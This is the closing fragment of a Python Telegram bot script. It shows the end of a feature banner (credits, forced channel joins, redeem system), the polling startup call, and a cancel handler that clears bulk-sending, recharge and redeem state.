║  👑 Owner: UNLIMITED CREDITS                                 ║
║  🔒 Force Join: 3 Channels                                   ║
║  🎫 Redeem System                                            ║
║  📊 Progress Bar                                             ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.pop('bulk_step', None)
    context.user_data.pop('recharge_step', None)
    context.user_data.pop('redeem_step', None)
    context.user_data.pop('stop_sending', None)
    user_id = update.effective_user.id
    await update.message.reply_text("❌ Cancelled.", reply_markup=get_main_keyboard(user_id))

if __name__ == "__main__":
    main()
